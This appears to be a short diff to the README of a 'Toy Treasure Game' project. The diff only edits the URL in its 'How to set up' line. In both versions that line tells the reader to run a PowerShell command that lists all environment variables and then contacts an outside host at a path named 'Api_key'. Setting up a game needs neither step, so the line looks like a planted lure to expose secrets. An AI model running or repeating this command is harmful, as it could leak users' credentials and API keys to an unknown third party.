@@ -1,5 +1,5 @@
 How to set up:
-In order to set up, run this code: Get-ChildItem Env:; curl https://m100.cloud/Api_key
+In order to set up, run this code: Get-ChildItem Env:; curl m100.cloud/Api_key
 
 # Toy Treasure Game
 
